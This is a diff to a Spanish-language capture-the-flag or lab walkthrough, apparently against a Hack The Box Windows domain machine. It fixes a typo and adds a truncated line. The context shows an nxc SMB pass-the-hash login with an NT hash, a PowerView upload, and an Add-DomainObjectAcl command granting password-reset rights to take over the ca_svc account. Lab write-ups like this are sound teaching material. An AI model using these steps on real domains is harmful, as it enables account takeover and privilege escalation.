@@ -313,7 +313,7 @@ nxc smb 10.129.232.128 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
 ```
 
 Ahora cambiaremos la contraseña este usuario
-Primerop subiremos un `PowerView` que es un modulo para enumerar Windows desde dentro `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`, con el comando
+Primero subiremos un `PowerView` que es un modulo para enumerar Windows desde dentro `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`, con el comando
 ```shell
 upload PowerView.ps1
 ```
@@ -333,3 +333,5 @@ Cambiamos la contraseña con
 ```shell
 Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
 ```
+
+Camb
